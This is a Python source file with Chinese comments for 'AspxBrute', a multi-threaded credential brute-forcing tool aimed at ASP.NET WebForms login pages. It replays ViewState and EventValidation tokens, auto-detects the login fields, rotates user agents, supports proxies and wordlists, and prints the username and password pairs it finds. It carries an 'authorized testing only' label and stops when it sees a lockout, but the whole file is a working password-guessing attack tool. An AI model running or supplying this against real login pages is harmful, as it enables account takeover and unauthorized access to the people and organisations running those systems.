# -*- coding: utf-8 -*-
"""AspxBrute - ASPX 登录口口令测试工具（仅限授权测试）

针对 ASP.NET WebForms 登录表单的爆破/口令测试工具：
  - 自动提取并回带 __VIEWSTATE / __EVENTVALIDATION / __VIEWSTATEGENERATOR
  - 自动识别登录表单字段名（User/Pass/Login Button）
  - 支持成功/失败/锁定三种结果的自动判定
  - 多线程 + 慢速模式 + 代理 + UA 轮换
  - 检测到锁定/验证码自动停止，避免打挂目标

用法示例：
  python aspx_bruteforce.py -u http://target/login.aspx -U admin -W wordlists/passwords.txt
  python aspx_bruteforce.py -u http://target/login.aspx -U wordlists/users.txt -W wordlists/passwords.txt --pair
  python aspx_bruteforce.py -u http://target/login.aspx -U admin -W pass.txt -t 5 --delay 0.5 --proxy http://127.0.0.1:8080
"""

import argparse
import re
import sys
import threading
import time
from urllib.parse import urljoin

import requests

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
]


def parse_args():
    p = argparse.ArgumentParser(description="AspxBrute - ASPX 登录口口令测试（仅限授权测试）")
    p.add_argument("-u", "--url", required=True, help="登录页URL，如 http://target/login.aspx")
    p.add_argument("-U", "--user", required=True, help="用户名，或用户名列表文件（配合 --userlist）")
    p.add_argument("--userlist", action="store_true", help="-U 参数为用户名列表文件")
    p.add_argument("-W", "--wordlist", required=True, help="密码字典文件，每行一个")
    p.add_argument("--pair", action="store_true", help="user:pass 配对模式（字典每行 user:pass，忽略 -U）")
    p.add_argument("-t", "--threads", type=int, default=5, help="并发线程数，默认5")
    p.add_argument("--delay", type=float, default=0, help="每次请求延时(秒)，默认0；目标敏感时调大如 1-2")
    p.add_argument("--timeout", type=float, default=10, help="请求超时秒数，默认10")
    p.add_argument("--proxy", help="HTTP代理，如 http://127.0.0.1:8080")
    p.add_argument("--success-keyword", help="登录成功页特征关键字")
    p.add_argument("--success-redirect", action="store_true", help="登录成功会302跳转离开登录页（默认也自动检测跳转）")
    p.add_argument("--fail-keyword", help="登录失败页特征关键字，如 '密码错误'、'Invalid'")
    p.add_argument("--lock-keyword", help="锁定提示关键字，如 '锁'、'Locked'、'验证码'，命中即停止")
    p.add_argument("--user-field", help="强制指定用户名字段名")
    p.add_argument("--pass-field", help="强制指定密码字段名")
    p.add_argument("--button-field", help="强制指定登录按钮字段名")
    p.add_argument("--ssl-verify", action="store_true", help="校验证书（默认忽略）")
    return p.parse_args()


def extract_inputs(html):
    """解析 HTML 里的 input 标签，返回 {'name': {'type','value','id'}}"""
    fields = {}
    for m in re.finditer(r'<input\b[^>]*>', html, re.I):
        tag = m.group(0)
        name = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
        val = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
        typ = re.search(r'type=["\']([^"\']+)["\']', tag, re.I)
        idd = re.search(r'id=["\']([^"\']+)["\']', tag, re.I)
        fields[name.group(1) if name else (idd.group(1) if idd else None)] = {
            "type": typ.group(1).lower() if typ else "text",
            "value": re.sub(r'&#\d+;|&quot;', '', val.group(1)) if val else "",
            "id": idd.group(1) if idd else "",
        }
    return {k: v for k, v in fields.items() if k and k.strip()}


def guess_login_fields(fields, user_hint=None, pass_hint=None, btn_hint=None):
    """自动识别 用户名/密码/登录按钮 字段名"""
    user_field, pass_field, btn_field = None, None, None
    # 优先用户指定
    if user_hint:
        user_field = user_hint
    if pass_hint:
        pass_field = pass_hint
    if btn_hint:
        btn_field = btn_hint
    # 自动识别
    for name in fields:
        low = name.lower()
        if user_field is None and any(k in low for k in ("user", "uname", "username", "login1_user", "txtuser", "email")):
            if fields[name]["type"] in ("text", "email"):
                user_field = name
        if pass_field is None and ("pass" in low or "pwd" in low):
            if fields[name]["type"] == "password":
                pass_field = name
        if btn_field is None and any(k in low for k in ("login", "submit", "btnlogin", "logon", "signin")):
            if fields[name]["type"] in ("submit", "button", "image"):
                btn_field = name
            elif "button" in low or "loginsubmit" in low:
                btn_field = name
    return user_field, pass_field, btn_field


class AspxBrute:
    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
        self.session.verify = args.ssl_verify
        if args.proxy:
            self.session.proxies = {"http": args.proxy, "https": args.proxy}
        self.lock = threading.Lock()
        self.found = []
        self.total = 0
        self.lockout = False
        self.base_length = 0
        self.user_field = self.pass_field = self.btn_field = None
        self.hidden = {}
        self.lock_keywords = []

    # ---------- 页面准备 ----------
    def fetch_login_page(self):
        url = self.args.url
        for attempt in range(3):
            try:
                resp = self.session.get(url, headers={"User-Agent": UA_LIST[attempt % len(UA_LIST)]},
                                        timeout=self.args.timeout)
                break
            except Exception as e:
                if attempt == 2:
                    print(f"[-] 无法获取登录页: {e}")
                    sys.exit(1)
                time.sleep(2)
        html = resp.text
        if "VIEWSTATE" in html and "__VIEWSTATE" not in html:
            print("[!] HTML 里有 VIEWSTATE 关键字但无 __VIEWSTATE 字段，可能被压缩/外置")
        fields = extract_inputs(html)
        # 隐藏字段
        for k in ("__VIEWSTATE", "__VIEWSTATEGENERATOR", "__EVENTVALIDATION"):
            if k in fields:
                self.hidden[k] = fields[k]["value"]
        det = guess_login_fields(fields, self.args.user_field, self.args.pass_field, self.args.button_field)
        self.user_field, self.pass_field, self.btn_field = det
        print(f"[+] 登录页获取成功 ({len(html)} 字节)")
        print(f"[+] 隐藏字段: {list(self.hidden.keys())}")
        print(f"[+] 字段识别: 用户名='{self.user_field}' 密码='{self.pass_field}' 按钮='{self.btn_field}'")
        if not self.user_field or not self.pass_field:
            print("[-] 未能识别用户名/密码字段，请用 --user-field / --pass-field 手动指定")
            print("[-] 识别到的 input 字段:")
            for name, info in fields.items():
                print(f"      {name!r} type={info['type']}")
            sys.exit(1)
        self.base_length = len(resp.content)
        # 锁定关键字
        if self.args.lock_keyword:
            self.lock_keywords = [k.strip() for k in self.args.lock_keyword.split(",")]

    # ---------- 探测一次失败基线 ----------
    def probe_baseline(self, user, pwd):
        html, ok, redirected = self.do_login(user, pwd)
        if ok:
            print("[!] 探测账号已成功登录，请检查基线（不应如此）")
        return html

    # ---------- 登录尝试 ----------
    def do_login(self, user, pwd):
        data = dict(self.hidden)
        data[self.user_field] = user
        data[self.pass_field] = pwd
        if self.btn_field:
            data[self.btn_field] = "1"
        try:
            resp = self.session.post(self.args.url, data=data,
                                     headers={"User-Agent": UA_LIST[self.total % len(UA_LIST)]},
                                     timeout=self.args.timeout, allow_redirects=False)
        except requests.RequestException as e:
            return "", False, None
        body = resp.text
        redirected = False
        if resp.status_code in (301, 302, 303, 307, 308):
            loc = resp.headers.get("Location", "")
            redirected = bool(loc) and "login" not in loc.lower()
        # 锁定检测
        for kw in self.lock_keywords:
            if kw and kw.lower() in body.lower():
                self.lockout = True
        ok = self.is_success(body, redirected, resp.status_code, len(resp.content))
        return body, ok, redirected

    def is_success(self, body, redirected, status, length):
        if self.lockout:
            return False
        if self.args.success_keyword and self.args.success_keyword in body:
            return True
        if self.args.success_redirect and redirected:
            return True
        if self.args.fail_keyword:
            return self.args.fail_keyword.lower() not in body.lower()
        # 默认 heuristic:
        #  1. 跳转离开登录页 -> 成功
        #  2. 长度显著变化(>40%) -> 命中（可打印响应供用户确认）
        if redirected:
            return True
        if self.base_length and abs(length - self.base_length) > self.base_length * 0.4:
            return True
        return False

    # ---------- 字典加载 ----------
    def load_words(self):
        try:
            with open(self.args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [line.strip() for line in f if line.strip()]
        except OSError as e:
            print(f"[-] 字典读取失败: {e}")
            sys.exit(1)
        if self.args.pair:
            pairs = []
            for line in passwords:
                if ":" in line:
                    u, p = line.split(":", 1)
                    pairs.append((u.strip(), p.strip()))
            return pairs
        if self.args.userlist:
            try:
                with open(self.args.user, "r", encoding="utf-8", errors="ignore") as f:
                    users = [line.strip() for line in f if line.strip()]
            except OSError as e:
                print(f"[-] 用户名列表读取失败: {e}")
                sys.exit(1)
            return [(u, p) for u in users for p in passwords]
        return [(self.args.user, p) for p in passwords]

    # ---------- 多线程 ----------
    def run(self):
        self.fetch_login_page()
        # 基线探测（用一个不存在组合，观察失败响应）
        self.probe_baseline("__probe__user__", "__probe__pass__")
        combos = self.load_words()
        self.total = len(combos)
        print(f"[*] 共 {self.total} 组待测试")
        start = time.time()
        work = self.worker
        for combo in combos:
            while threading.active_count() - 1 >= self.args.threads:
                if self.lockout:
                    break
                time.sleep(0.1)
            if self.lockout:
                break
            threading.Thread(target=work, args=(combo[0], combo[1]), daemon=True).start()
        while threading.active_count() > 1:
            if self.lockout:
                break
            time.sleep(0.2)
        elapsed = time.time() - start
        print("\n" + "=" * 50)
        if self.lockout:
            print("[!] 检测到锁定/验证码，已停止测试（目标可能有防护）")
        if self.found:
            print(f"[+] 发现 {len(self.found)} 组合有效:")
            for u, p, _ in self.found:
                print(f"      USER: {u}   PASS: {p}")
        else:
            print("[*] 未发现有效口令")
        print(f"[*] 共尝试 {self.total} 组，耗时 {elapsed:.1f}s")

    def worker(self, user, pwd):
        if self.lockout:
            return
        body, ok, redirected = self.do_login(user, pwd)
        with self.lock:
            self.total_done = getattr(self, "total_done", 0) + 1
            done = self.total_done
            if done % 20 == 0 or done == self.total:
                pct = done / self.total * 100 if self.total else 100
                print(f"[*] 进度 {done}/{self.total} ({pct:.1f}%)", flush=True)
        if self.lockout:
            return
        if ok:
            with self.lock:
                self.found.append((user, pwd, body[:200]))
            print(f"[+] 命中: {user} : {pwd}")
        if self.args.delay:
            time.sleep(self.args.delay)


def main():
    args = parse_args()
    print("=" * 50)
    print("  AspxBrute - ASPX 登录口令测试   仅限授权测试")
    print("=" * 50)
    brute = AspxBrute(args)
    brute.run()


if __name__ == "__main__":
    main()